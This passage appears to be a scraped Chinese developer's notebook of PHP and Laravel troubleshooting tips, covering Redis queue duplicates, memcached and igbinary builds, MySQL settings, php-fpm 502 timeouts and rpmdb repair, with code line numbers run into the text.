'UTF-8', $entry['name']); $filename = $filename ?: $entry['name']; $size = $entry['size']; $comp_size = $entry['comp_size']; $mtime = $entry['mtime']; $crc = $entry['crc']; $is_dir = ($crc == 0); $path = '/' . $filename; if ($dir and (stripos($filename, $dir) !== 0 or strtolower($filename) == strtolower($dir))) continue; $_names = explode('/', $filename); $_idx = count($_names)-1; if (!$subdir and $_idx != count(explode('/', $dir))) continue; $name = $_names[$_idx]; $index = $i; //$data = $zip-&gt;getFromIndex($i); $entry = compact('name', 'path', 'size', 'comp_size', 'mtime', 'crc', 'index', 'is_dir'); $results[] = $entry; if ($_callback) @call_user_func($callback, $entry, $index, $zip); &#125; $zip-&gt;close(); return $results;&#125; Memcached::get()could not unserialize value, no igbinary support1234567891011121314151617181920212223242526272829303132333435363738394041424344454647使用laravel Cache::get()时报错，版本PHP7 ,报错文件 vendor/laravel/framework/src/Illuminate/Cache/MemcachedStore.php重新安装memcached,3.x版本是支持php7的，而php5.2-5.6需要使用2.x版本$ wget https://codeload.github.com/php-memcached-dev/php-memcached/tar.gz/v3.1.3 $ tar -zxvf php-memcached-3.1.3.tar.gz$ cd php-memcached-3.1.3 $/php7/bin/phpizeConfiguring for:PHP Api Version: 20151012Zend Module Api No: 20151012Zend Extension Api No: 320151012$ ./configure --enable-memcached --enable-memcached-igbinary --with-php-config=/php7/bin/php-config$ make &amp;&amp; make installBuild complete.Don't forget to run 'make test'.Installing shared extensions: /php7/lib/php/extensions/no-debug-zts-20151012/$ php7 --iniConfiguration File (php.ini) Path: /php7/etc/Loaded Configuration File: /php7/etc/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none)$ vi /php7/etc/php.iniextension=memcache.soextension=/php7/lib/php/extensions/no-debug-zts-20151012/memcached.so安装igbinary#wget http://pecl.php.net/get/igbinary-2.0.8.tgz#tar -zxvf igbinary-2.0.8.tgz# cd igbinary-2.0.8# /php7/bin/phpizeConfiguring for:PHP Api Version: 20151012Zend Module Api No: 20151012Zend Extension Api No: 320151012# ./configure --with-php-config=/php7/bin/php-config#make &amp;&amp; make installBuild complete.Don't forget to run 'make test'.Installing shared extensions: /php7/lib/php/extensions/no-debug-zts-20151012/Installing header files: /php7/include/php/参考http://www.runoob.com/memcached/php-connect-memcached.html 深入理解PHP之foreach laravel redis 队列重复执行123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169现象 https://suren1986.in/index.php/archives/44/有时跑一些很耗费时间的异步脚本，会在 artisan queue:listen 时通过 --timeout=3600 设置长一点的时间，以避免超时。如果： 1. 使用 Redis 存放 queue 信息； 2. 跑了多个进程 artisan queue:listen --timeout=3600；3. 监听同一个 queue；4. Job 的时间超过 60 秒。就会发生同一个脚本被运行多次的情况。"LPOP""queues:default"#取出任务后，先要放到 queues:default:reserved zset 中"ZADD""queues:default:reserved""1485386842" "&#123;\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"data\":&#123;\"commandName\":\"App\\\\Jobs\\\\ExampleJob\",\"command\":\"O:19:\\\"App\\\\Jobs\\\\ExampleJob\\\":7:&#123;s:17:\\\"\\u0000*\\u0000userIdentifier\\\";N;s:9:\\\"\\u0000*\\u0000realIp\\\";N;s:12:\\\"\\u0000*\\u0000requestId\\\";N;s:6:\\\"\\u0000*\\u0000job\\\";N;s:10:\\\"connection\\\";N;s:5:\\\"queue\\\";N;s:5:\\\"delay\\\";N;&#125;\"&#125;,\"id\":\"bwA7ICPqnjYiM0ErjRBNwn0kVWF6KeAs\",\"attempts\":1&#125;"# 任务执行完毕后， 从 queues:default:reserved zset 中删除"ZREM""queues:default:reserved""&#123;\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"data\":&#123;\"commandName\":\"App\\\\Jobs\\\\ExampleJob\",\"command\":\"O:19:\\\"App\\\\Jobs\\\\ExampleJob\\\":7:&#123;s:17:\\\"\\u0000*\\u0000userIdentifier\\\";N;s:9:\\\"\\u0000*\\u0000realIp\\\";N;s:12:\\\"\\u0000*\\u0000requestId\\\";N;s:6:\\\"\\u0000*\\u0000job\\\";N;s:10:\\\"connection\\\";N;s:5:\\\"queue\\\";N;s:5:\\\"delay\\\";N;&#125;\"&#125;,\"id\":\"bwA7ICPqnjYiM0ErjRBNwn0kVWF6KeAs\",\"attempts\":1&#125;"# 如果任务失败，会放到 queue:default:delay zset 中"ZADD""queues:default:delayed""1485386783" "&#123;\"job\":\"Illuminate\\\\Queue\\\\CallQueuedHandler@call\",\"data\":&#123;\"commandName\":\"App\\\\Jobs\\\\ExampleJob\",\"command\":\"O:19:\\\"App\\\\Jobs\\\\ExampleJob\\\":7:&#123;s:17:\\\"\\u0000*\\u0000userIdentifier\\\";N;s:9:\\\"\\u0000*\\u0000realIp\\\";N;s:12:\\\"\\u0000*\\u0000requestId\\\";N;s:6:\\\"\\u0000*\\u0000job\\\";N;s:10:\\\"connection\\\";N;s:5:\\\"queue\\\";N;s:5:\\\"delay\\\";N;&#125;\"&#125;,\"id\":\"uuPBCq4QE9ocnw8UbkLhUl2Lh07yPm6M\",\"attempts\":1&#125;"/** * Pop the next job off of the queue. *laravel 5.0 * @param string $queue * @return \Illuminate\Contracts\Queue\Job|null */ public function pop($queue = null) &#123; $original = $queue ?: $this-&gt;default; $queue = $this-&gt;getQueue($queue); if ( ! is_null($this-&gt;expire)) &#123; $this-&gt;migrateAllExpiredJobs($queue); &#125; $job = $this-&gt;getConnection()-&gt;lpop($queue); if ( ! is_null($job)) &#123; $this-&gt;getConnection()-&gt;zadd($queue.':reserved', $this-&gt;getTime() + $this-&gt;expire, $job); return new RedisJob($this-&gt;container, $this, $job, $original); &#125; &#125; /** * Pop the next job off of the queue. *laravel 5.5 * @param string $queue * @return \Illuminate\Contracts\Queue\Job|null */ public function pop($queue = null) &#123; $this-&gt;migrate($prefixed = $this-&gt;getQueue($queue)); list($job, $reserved) = $this-&gt;retrieveNextJob($prefixed); if ($reserved) &#123; return new RedisJob( $this-&gt;container, $this, $job, $reserved, $this-&gt;connectionName, $queue ?: $this-&gt;default ); &#125; &#125;原因在 Laravel 的框架中，通过 Redis 获取下一个 Job 是通过 Illuminate\RedisQueue 完成的。获取下个 Job 的函数是 public function pop()。假设 queue 的名称为 default，Laravel 在获取到脚本后，会将它放入 default:reserved 中。 default:reserved 的结构是 sorted hash，被放入的 Job 会被赋予一个权值：time() + this-&gt;expire，默认的 this-&gt;expire = 60，Laravel 官方的配置中(config/queue.php)，也默认了 60 秒。这个函数在从 Redis queue 中 pop 一个数据前，会将所有过期的 Job 放回到原来的 queue 中。过期 Job 的来源包括 default:reserved，获取所有 default:reserved 中，权值小于当前时间的 Job。于是，超过 60 秒没有执行完成的 Job 被放入了 default queue 中，等待下一次执行。解决方案解决方法很简单，将 config/queue.php，相应配置的 expire 设置为 null 即可。因为 Illuminate\RedisQueue 中，如果 expire 为 null，是不会做将将所有过期的 Job 放回到原来的 queue 中的操作的。安装上redisadmin后查看，发现添加的任务一直保留在队列中，没有被取走（删除）。并且这条任务的状态变为了reserved（保留的）。然后在网上发现了这篇文章(http://yansu.org/2014/04/11/redis-queue-in-laravel.html)，它讲了laravel使用redis作为队列系统的执行流程。其中讲了什么情况下任务的状态会变为reserved。在RedisQueue:pop()方法中，有这样一句：$this-&gt;redis-&gt;zadd($queue.':reserved', $this-&gt;getTime() + 60, $job);这里将当前执行的任务放到另外一个reserved队列中，超时时间是60s。也就是说，如果60s后这个任务没有被删除掉，则任务会重新被放入队列中来。因此，在实际的使用过程中，任务很可能被多次执行。解决的办法是class SendEmail &#123; public function fire($job, $data) &#123; $job-&gt;delete(); // job &#125;&#125;retry_after配置选项和--timeout命令行选项是不一样的，但是可以同时工作来保证任务不会丢失并且不会重复执行。--timeout应该永远都要比retry_after短至少几秒钟的时间。这样就能保证任务进程总能在失败重试前就被杀死了。如果你的--timeout选项大于retry_after配置选项，你的任务可能被执行两次。https://phpartisan.cn/news/97.html对队列的重试次数做限制，超出限制后删除队列或延迟处理。通过对队列错误事件的监听我才知道，原来是由于在我的事件中使用了Model模型，再进入队列执行的时候，会使用Model的主键再去反查一次模型数据，而且使用的是firstOrFail方法，可能是由于之前的一些数据被物理删除了导致找不到的原因，这这里就报错了，而且没有删除的机制，所以队列一直在重试！使用Laravel队列时一定要记得监听Illuminate\Queue\Events\JobExceptionOccurred;Illuminate\Queue\Events\JobFailed;两个事件不然发生错误队列就删除不了了，如果是在执行队列中handle函数中一定要记得及时删除队列，使用delete()方法即可！如果在执行handle的过程中出现抛出异常，那么本任务就算执行失败，就会将失败的任务存放到fail_jobs表当中。当然也可以手动释放任务，如下尝试执行超过2次，就释放本次任务，不在存入fail_jobs表中。if($this-&gt;attempts() &gt; 2)&#123; $this-&gt;release();&#125;被放入fail_jobs表中的任务是不会再执行了，重启之后和不会执行。此外我们可以在服务中注册Queue::failing来侦听失败时间，异步通知给开发人员https://www.omybug.com/2017/05/05/Laravel-%E9%98%9F%E5%88%97/class AppServiceProvider extends ServiceProvider&#123; public function boot() &#123; Queue::failing(function ($connection, $job, $data) &#123; // Notify team of failing job... &#125;); &#125; ........&#125;在队列任务类上直接定义failed方法/** * 处理失败任务 * * @return void */ public function failed() &#123; // Called when the job is failing... &#125;要查看已插入到failed_jobs数据表中的所有失败任务，可以使用Artisan命令queue:failed：php artisan queue:failed+------+------------+---------+------------------------------------------+---------------------+| ID | Connection | Queue | Class | Failed At |+------+------------+---------+------------------------------------------+---------------------+| 8766 | redis | default | Illuminate\Events\CallQueuedHandler@call | 2019-01-09 13:40:42 || 8765 | redis | default | Illuminate\Events\CallQueuedHandler@call | 2019-01-09 13:37:43 || 8764 | redis | default | Illuminate\Events\CallQueuedHandler@call | 2019-01-09 13:36:49 该命令将会列出任务ID，连接，对列和失败时间，任务ID可用于重试失败任务，例如，要重试一个ID为5的失败任务，要用到下面的命令：php artisan queue:retry 5要重试所有失败任务，使用如下命令即可：php artisan queue:retry all如果你要删除一个失败任务，可以使用queue:forget命令：php artisan queue:forget 5要删除所有失败任务，可以使用queue:flush命令：php artisan queue:flush MySQL导入SQL出现MySQL server has gone away错误12345678910111213MySQL导入SQL出现MySQL server has gone away错误项目中需要导入一个200M的SQL文件，导入过程中会出现MySQL server has gone away错误查看一下允许导入的文件大小，默认是1Mshow global variables like 'max_allowed_packet';调整my.cnf中的值max_allowed_packet = 512M零时调整可以用，重启之后会失效set global max_allowed_packet=536870912; pdo查询出的数据均自动转换为字符串123456789PDO::ATTR_STRINGIFY_FETCHES 提取的时候将数值转换为字符串。 PDO::ATTR_EMULATE_PREPARES 启用或禁用预处理语句的模拟。在实例化medoo的时候在option参数设置中加入这两个选项，即可查询出原有数据类型：https://blog.cooooler.com/2018/12/15/%E4%BD%BF%E7%94%A8medoo%E6%9F%A5%E8%AF%A2%E5%87%BA%E7%9A%84%E6%95%B0%E6%8D%AE%E5%9D%87%E8%87%AA%E5%8A%A8%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2/'option' =&gt; [ PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL, PDO::ATTR_STRINGIFY_FETCHES =&gt; false, PDO::ATTR_EMULATE_PREPARES =&gt; false ], git clone克隆速度过慢问题123//https://blog.cooooler.com/2018/07/18/%E8%A7%A3%E5%86%B3git-clone%E5%85%8B%E9%9A%86%E9%80%9F%E5%BA%A6%E8%BF%87%E6%85%A2%E9%97%AE%E9%A2%98/git config --global http.proxy socks5://127.0.0.1:1080git config --global https.proxy socks5://127.0.0.1:1080 laravel中导出excel乱码12345678910//https://blog.cooooler.com/2018/05/11/PHP%E5%AF%BC%E5%87%BAexcel%E4%B9%B1%E7%A0%81%E7%9A%84%E7%BB%88%E6%9E%81%E8%A7%A3%E5%86%B3%E5%A4%A7%E6%B3%95/Excel::create($title, function ($excel) use ($data, $type, $rows) &#123; $excel-&gt;sheet('导出excel', function ($sheet) use ($data, $type, $rows) &#123; $sheet-&gt;rows($data); &#125;); // 设置bom防止中文乱码 只需要在生成文件时输出BOM头即可。 echo chr(0xEF) . chr(0xBB) . chr(0xBF); &#125;)-&gt;export($type); laravel中进行PDF导出遇到的问题123456789101112https://blog.cooooler.com/2018/08/29/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Blaravel%E4%B8%AD%E8%BF%9B%E8%A1%8CPDF%E5%AF%BC%E5%87%BA%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/composer require barryvdh/laravel-snappy` php artisan vendor:publish --provider="Barryvdh\Snappy\ServiceProvider" `导出pdf中文乱码问题首先需要下载一个支持中文的字体包，比如微软雅黑然后在/usr/share/fonts目录中新建一个文件夹，例如文件夹名为chinese将下载好的字体文件移动到新建的文件夹中然后执行以下命令安装字体mkfontscalemkfontdirfc-cache curl获取数据乱码1234567891011121314151617181920212223composer require phlib/guzzle-middlewaretry &#123; // 生成handler $handler = \GuzzleHttp\HandlerStack::create(); $handler-&gt;push(new \Phlib\Guzzle\ConvertCharset()); $handler-&gt;push(new \Phlib\Guzzle\AbsoluteUrls()); // 设置请求参数 $option = [ 'timeout' =&gt; 10, 'handler' =&gt; $handler ]; // 发起请求 $client = new \GuzzleHttp\Client($option); $response = $client-&gt;get('需要请求的url'); &#125; catch (\Exception $exception) &#123; return $exception-&gt;getMessage(); &#125; return (string)$response-&gt;getBody(); mysql emoji12345678utf8_unicode_ci 只能存储 3 个字节的字符，无法应对 Emoji 这种需要 4 个字节的字符。https://suren1986.in/index.php/archives/45/弄清楚问题，解决起来就简单了，修改字符集为 utf8mb4。不过修改的时候又碰到 1 个问题：utf8mb4_bin, utf8mb4_unicode_ci, utf8mb4_general_ci 应该选哪个？参考 MySQL 的 官方文档, ci 后缀表示不区分大小写(case insensitive)，bin 因为通过二进制比较，所以区分大小写：参考 stackoverflow 的这篇 回答 unicode 在对很多语言来说排序和比较是准确的，但是相对慢一些，general 没有实现所有的 Unicode 排序规则，有些语言会有问题，但是快一些，不过到具体实践中，中文没什么差别，速度相差无几，我觉得用 unicode 更好一些，少留坑，还好我的表数据量不大，线上很快就转换完了，几百万数据就得半夜三更弄了。改完数据表还没结束，代码中连接数据库时指定的字符集也得改为 utf8mb4。 composer install、update出错需要Token12345报错信息：使用SSH Key做身份认证克隆失败，请输入你的Github凭证来访问私人的镜像。（翻译得不好，大概是这个意思）可是还是不懂这里需要填写的是什么，还是几番Google找到了答案。原来这里要输入的本地SSH生成的公钥,复制~/.ssh/id_rsa.pub内容粘贴到这里，回车就可以了 MISCONF Redis is configured to save RDB snapshots12345678910https://laravel-china.org/articles/22025#fa405f有两种修改方法，一种是通过redis命令行修改，另一种是直接修改redis.conf配置文件命令行修改方式示例：127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no修改redis.conf文件：vi打开redis-server配置的redis.conf文件，然后使用快捷匹配模式：/stop-writes-on-bgsave-error定位到stop-writes-on-bgsave-error字符串所在位置，接着把后面的yes设置为no即可。我用的命令行修改方式，docker exec -it 0d redis-cli 0d是我的redis容器127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no laravel的坑12345678910111213141516171819https://www.jianshu.com/p/da9c0cae59ef1.多数据库使用事务的坑（model指定了$connection，用的是/config/database.php里的连接）使用DB::beginTransaction()是没有效果的，相当于未使用事务，必须指定连接，事务才能生效DB::connection('连接名')-&gt;beginTransaction()；DB::connection('连接名')-&gt;rollback();DB::connection('连接名')-&gt;commit();2.主从分离中事务的坑在事务开始直到结束这一过程中，所有的查询更新删除操作都作用在主库，所以不必担心在事务中的查询会查询到从库，也没必要在事务中为了查询主库而使用onWriteConnection；未使用事务的地方，想要读主库的数据，可以使用onWriteConnection： Table::onWriteConnection()-&gt;find($id);3.increment与decrement的坑$rs1 = Order::find(41)-&gt;decrement('shipping_fee', 0);echo '$rs1 = '.$rs1.' ';$rs2 = Order::find(41)-&gt;decrement('order_amount', 0);echo '$rs2 = '.$rs2.' ';运行结果：$rs1 = 1 $rs2 = 0原因分析：查看这两行代码执行的真实sql语句：update orders set shipping_fee = shipping_fee - 0, updated_at = '2017-08-03 10:10:25' where id = '41'update orders set order_amount = order_amount - 0, updated_at = '2017-08-03 10:10:25' where id = '41'结论：因为使用了laravel时间自动更新的功能，而且更新的是同一条数据，updated_at为最新时间，第一条语句执行返回条数1，而第二条的updated_at跟第一条一样，返回的更新条数就为0了。 crontab12新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。当crontab失效时，可以尝试/etc/init.d/crond restart解决问题,或者查看日志看某个job有没有执行/报错tail -f /var/log/cron laravel 读操连接了读库和写库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122/**vendor\laravel\framework\src\Illuminate\Database\Connectors\ConnectionFactory.php * Establish a PDO connection based on the configuration. *https://laravel-china.org/topics/1879/laravel-5-configuration-read-and-write-separation-and-source-analysis * @param array $config * @param string $name * @return \Illuminate\Database\Connection */public function make(array $config, $name = null)&#123; $config = $this-&gt;parseConfig($config, $name); // 如果配置了读写分离，则同时创建读库和写库的链接 if (isset($config['read'])) &#123; return $this-&gt;createReadWriteConnection($config); &#125; // 如果没有配置，默认创建单个数据库链接 return $this-&gt;createSingleConnection($config);&#125;protected function createSingleConnection(array $config) &#123; $pdo = $this-&gt;createConnector($config)-&gt;connect($config);dump($config); return $this-&gt;createConnection($config['driver'], $pdo, $config['database'], $config['prefix'], $config); &#125; array:11 [▼ "driver" =&gt; "mysql" "port" =&gt; "3306" "host" =&gt; "127.0.0.1" "database" =&gt; "mysql" "username" =&gt; "root" "password" =&gt; "root" "charset" =&gt; "utf8" "collation" =&gt; "utf8_unicode_ci" "prefix" =&gt; "" "strict" =&gt; false "name" =&gt; "read" ]cat config/database.php'connections' =&gt; [ 'mysql' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_HOST', 'localhost'), 'port' =&gt; env('DB_PORT', 3306), 'database' =&gt; env('DB_DATABASE', 'forge'), 'username' =&gt; env('DB_USERNAME', 'forge'), 'password' =&gt; env('DB_PASSWORD', ''), 'charset' =&gt; 'utf8mb4', 'collation' =&gt; 'utf8mb4_unicode_ci', 'prefix' =&gt; env('DB_PREFIX', 'tbl_'), 'timezone' =&gt; env('DB_TIMEZONE', '+00:00'), 'strict' =&gt; false, 'options' =&gt; array( PDO::ATTR_STRINGIFY_FETCHES =&gt; true, PDO::ATTR_EMULATE_PREPARES =&gt; false ), ], 'mysql-read' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_HOST_READ', 'localhost'), 'port' =&gt; env('DB_PORT', 3306), 'database' =&gt; env('DB_DATABASE', 'forge'), 'username' =&gt; env('DB_USERNAME', 'forge'), 'password' =&gt; env('DB_PASSWORD', ''), 'charset' =&gt; 'utf8mb4', 'collation' =&gt; 'utf8mb4_unicode_ci', 'prefix' =&gt; env('DB_PREFIX', 'tbl_'), 'timezone' =&gt; env('DB_TIMEZONE', '+00:00'), 'strict' =&gt; false, 'options' =&gt; array( PDO::ATTR_STRINGIFY_FETCHES =&gt; true, PDO::ATTR_EMULATE_PREPARES =&gt; false ), ], 'mysql-write' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_HOST_WRITE', 'localhost'), 'port' =&gt; env('DB_PORT', 3306), 'database' =&gt; env('DB_DATABASE', 'forge'), 'username' =&gt; env('DB_USERNAME', 'forge'), 'password' =&gt; env('DB_PASSWORD', ''), 'charset' =&gt; 'utf8mb4', 'collation' =&gt; 'utf8mb4_unicode_ci', 'prefix' =&gt; env('DB_PREFIX', 'tbl_'), 'timezone' =&gt; env('DB_TIMEZONE', '+00:00'), 'strict' =&gt; false, 'options' =&gt; array( PDO::ATTR_STRINGIFY_FETCHES =&gt; true, PDO::ATTR_EMULATE_PREPARES =&gt; false ), ], ], class DBConnService &#123; private static $read_conn = null; private static $write_conn = null; private function __construct() &#123;&#125; public static function writeConn() &#123; if (self::$write_conn === null) &#123; self::$write_conn = DB::connection('mysql-write'); &#125; return self::$write_conn; &#125; public static function readConn() &#123; if (self::$read_conn === null) &#123; self::$read_conn = DB::connection('mysql-read'); &#125; return self::$read_conn; &#125; &#125; $sql = "SELECT $fields FROM $table WHERE field = ? "; $result = DBConnService::readConn()-&gt;select($sql, [$field]); //$type = OrderTypes::find($type); $type = OrderTypes::on('mysql-read')-&gt;find($type);//https://laravelacademy.org/post/9692.html 这样查询时只连接从库一次，而且一次请求中也只连接从库一次http://www.voidcn.com/article/p-dypdejbw-bew.html 502 Bad Gateway12345678910111213141516171819202122 [error] 26653#0: *748 recv() failed (104: Connection reset by peer) while reading response header from upstream, client: 10.235.51.48, server: xxx.cn, request: "GET /api/openapi.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9001", host: "xx.cn"在php.ini和php-fpm.conf中分别有这样两个配置项：max_execution_time和request_terminate_timeout。这两项都是用来配置一个PHP脚本的最大执行时间的。当超过这个时间时，PHP-FPM不只会终止脚本的执行，还会终止执行脚本的Worker进程。所以Nginx会发现与自己通信的连接断掉了，就会返回给客户端502错误。 request_terminate_timeout可以覆盖max_execution_time，所以如果不想改全局的php.ini，那只改PHP-FPM的配置就可以了。打开 php-fpm.conf 发现了：request_terminate_timeout = 5request_terminate_timeout mixed设置单个请求的超时中止时间。该选项可能会对 php.ini 设置中的 ‘max_execution_time’ 因为某些特殊原因没有中止运行的脚本有用。设置为 ‘0’ 表示 ‘Off’。可用单位：s（秒），m（分），h（小时）或者 d（天）。默认单位：s（秒）。默认值：0（关闭）。估计就是这儿了 ，改成 30 还是不行重启fpm 就好了[root@localhost ~]# cat fpm_restart.sh#! /bin/bashPIDS=`ps aux | grep fpm | grep php | awk '&#123;print $2&#125;'`for PID in $PIDSdo kill -9 $PIDdone/data0/opt/php55/sbin/php-fpmhttps://blog.csdn.net/crj121624/article/details/79956283 如果你服务器并发量非常大，那只能先增加机器，然后按以下方式优化会取得更好效果;但如果你并发不大却出现502，一般都可以归结为配置问题，脚本超时问题。 ffmpeg: command not found12345678910111213通过PHP调用这个命令，没有引入对应的环境变量，导致找不到这个命令解决办法在PHP-fpm.conf的配置文件里面把下面几行前面的;去掉我的PHP配置文件php-fpm.conf 在/usr/local/php/etc/php-fpm.conf ;env[PATH]里面加入ffmpeg的路径，比如我的在/data/binenv[PATH] = /usr/local/bin:/usr/bin:/bin:/data/binenv[TMP] = /tmpenv[TMPDIR] = /tmpenv[TEMP] = /tmpenv[LD_LIBRARY_PATH] = /usr/local/lib Warning: simplexml_load_file()123Warning: simplexml_load_file(): I/O warning : failed to load external entity "xxx "后来将simplexml_load_file("XXXX")替换成simplexml_load_string(file_get_contents("XXXX")); 同时读写一个文件的问题12345678$fp = fopen("/tmp/lock.txt","w+"); if(flock($fp, LOCK_EX))&#123;// 进行排它型锁定http://www.bowen-tech.top/articles/detail/ar_5bc44ba823667_CJPBkHZN fwrite($fp,"Write something here\n"); flock($fp, LOCK_UN);// 释放锁定 &#125;else&#123; echo "Couldn't lock the file !"; &#125; fclose($fp); nginx: [error] open() “/run/nginx.pid” failed12345678910111213[root@VM_0_14_centos gogs]# ps aux|grep nginxroot 7984 0.0 0.0 4228 24 ? Ss Jan21 0:00 runsv nginxroot 9479 0.0 0.0 4372 4 ? S Jan21 0:00 svlogd -tt /var/log/gitlab/nginxroot 15221 0.0 0.0 112708 972 pts/0 R+ 14:42 0:00 grep --color=auto nginxroot 24987 0.0 0.0 38456 36 ? Ss Jan22 0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginxgitlab-+ 24993 0.0 0.0 44792 84 ? S Jan22 0:00 nginx: worker processgitlab-+ 24994 0.0 0.0 40540 120 ? S Jan22 0:00 nginx: cache manager process[root@VM_0_14_centos gogs]# pkill -9 nginx[root@VM_0_14_centos gogs]# nginx -s reloadnginx: [error] invalid PID number "" in "/run/nginx.pid"nginx根本就没有启动过，所以pid文件的值为空没法平滑启动，先启动了才能平滑启动[root@VM_0_14_centos gogs]# nginx -c /etc/nginx/nginx.conf[root@VM_0_14_centos gogs]# nginx -s reload 50212345678910111213141516171819202122232425262728Nginx的超时配置fastcgi_connct_timeout 60fastcgi_read_timeout 300fastcgi_send_timeout 300php.ini PHP-FPM 的超时配置max_execution_time 300request_terminate_timeout 0function pft_file_get_contents($url, $timeout = 10, $header = [])&#123; $url = strval($url); $timeout = intval($timeout); $timeout = $timeout &lt;= 0 ? 10 : $timeout; $contextOptions = [ 'http' =&gt; ['timeout' =&gt; $timeout] ]; if($header) &#123; $contextOptions['http']['header'] = $header; &#125; $context = stream_context_create($contextOptions); $res = file_get_contents($url, false, $context); return $res;&#125;在Mysql和Redis服务器的配置中就会设置wait_timeout 和 timeout 参数，保证连接在超时没有连接的情况下断开连接。在程序方面需要做的就是处理超时后的'The MySQL server has gone away' 和 'PHP Fatal error: Uncaught exception 'RedisException' with message 'read error on connection'' 的异常捕获和重连接处理。不过正常情况下，这些在底层框架应该都做了统一的封装。https://www.jianshu.com/p/3e3fb0459ca3 php.ini max_execution_time=1，不一定1s后就会中止脚本，可能是2s、3s甚至更长的时间；而request_terminate_timeout=4则就会在4s后中止脚本的执行。所以在配置超时时间的时候，最好两个都配置，max_execution_time时间短一点，而request_terminate_timeout时间长一点 php -a 无法使用12345678910111213141516171819202122232425//https://github.com/codcodog/Blog/issues/77编译安装的 PHP 7.1.12， 在命令行输入 php -a, 提示 Interactive mode enabled, 无法使用.解决办法：安装 readline 扩展.$ cd /usr/local/src/php-7.1.12/ext/readline$ phpize$ ./configure --with-php-config=/usr/local/php/bin/php-configchecking for PHP installed headers prefix... /usr/local/php/include/phpchecking if debug is enabled... nochecking if zts is enabled... nochecking for re2c... re2cchecking for re2c version... 0.14.3 (ok)checking for gawk... gawkchecking for libedit readline replacement... yes, sharedconfigure: error: Please reinstall libedit - I cannot find readline.h$ make &amp;&amp; make install$ make clean编辑 php.ini， 添加 extension=readline.so 扩展.查看是否加载扩展$ php -m | grep readlinereadline json_decode()返回null1234567json_decode()函数，要求输入的字符串是有要求的：使用UTF-8编码不能在最后元素有逗号不能使用单引号不能有\r,\t所以，在接口传过来的json字符串中，需要查看是否包含了BOM头，如果有，去除 env忽略12在env中为DB_PASSWORD=abcde#142!*，但是在PHP代码中读取的数据库密码配置为abcde.env文件中，对密码字段加上双引号,如DB_PASSWORD="abcde#142!*"，然后一切恢复正常。 exceeded the timeout of 60 seconds123456[Symfony\Component\Process\Exception\ProcessTimedOutException] The process ""/usr/local/Cellar/php55/5.5.14/bin/php" artisan queue:work --queue="QUEUE_URL" --delay=0 --memory=128 --sleep=3 --tries=0" exceeded the timeout of 60 seconds.https://stackoverflow.com/questions/25877752/laravel-queue-process-timeout-error/26238686 php artisan queue:listen --timeout=0 set_exception_handler() 不再保证收到的一定是 Exception 对象12345678910&lt;?php// PHP 5 时代的代码将会出现问题function handler(Exception $e) &#123; ... &#125;set_exception_handler('handler');// 兼容 PHP 5 和 7 http://www.syyong.com/php/Php5-5-upgrade-to-php7-2.htmlfunction handler($e) &#123; ... &#125;// 仅支持 PHP 7function handler(Throwable $e) &#123; ... &#125; 二维码生成乱码123456789composer require endroid/qr-codeuse Endroid\QrCode\QrCode;$qrCode = new QrCode('Life is too short to be generating QR codes');header('Content-Type: '.$qrCode-&gt;getContentType());echo $qrCode-&gt;writeString();//加上die;才能访问 https://learnku.com/articles/22850?#reply80905die; yum Error: rpmdb open failed12345678910111213141516171819202122232425262728 yum install net-toolserror: rpmdb: BDB0113 Thread/process 23439/140210621216832 failed: BDB1507 Thread died in Berkeley DB libraryerror: db5 error(-30973) from dbenv-&gt;failchk: BDB0087 DB_RUNRECOVERY: Fatal error, run database recoveryerror: cannot open Packages index using db5 - (-30973)error: cannot open Packages database in /var/lib/rpmCRITICAL:yum.main:Error: rpmdb open failed由于强制结束了yum 操作而导致rpm数据库被损坏了！1. 进入目录， 查看相关rpmdb文件# cd /var/lib/rpm/ # ls | grep 'db.' __db.001 __db.002 __db.003 __db.0042. 删除损坏的rpmdb文件将原rpmdb文件都更名为结尾带.bak的文件# for i in `ls | grep 'db.'`;do mv $i $i.bak;done或# rm -f __db.* # 清除原rpmdb文件3. 重建rpm数据库# rpm --rebuilddb 4. 清除所有yum的缓存# yum clean all 泄露 env 配置12345678Laravel 默认依赖的 filp/whoops包 ，当 .env 文件中配置 APP_DEBUG=true 时，会在出错页面打印 .env 配置信息。Laravel 常用的 barryvdh/laravel-debugbar 包，当 .env 文件中配置 APP_DEBUG=true 时，会输出 session 等敏感信息。以上两个包默认都在 composer.json 的 require-dev 分支里面，生产环境不安装这两个包，就算 APP_DEBUG 配置成 true，也不会泄露太多敏感的信息。所以，生产环境部署系统时，一定要加 --no-dev：composer install --no-dev -vvv切记：不要让别人能直接访问到 .env 文件 laravel 路由冲突1234567891011//restful 查看Route::get('products/&#123;product&#125;', 'ProductsController@show')-&gt;name('products.show');//收藏Route::get('products/favorites', 'ProductsController@favorites')-&gt;name('products.favorites');教程中给出的一种解决方式是将两个路由的位置进行上下调整，当项目变的越来越大，路由增多后，这样的操作可能会给后期挖坑所以建议增加where条件限制//restful 查看，product仅支持数整，当id规则变更后，只需更改正则条件Route::get('products/&#123;product&#125;', 'ProductsController@show')-&gt;name('products.show')-&gt;where(['product' =&gt; '[0-9]+']); No ‘Access-Control-Allow-Origin’ header is present on the requested resource123456789101112131415161718192021发送非简单请求时，伺服器端会先收到一个 OPTIONS 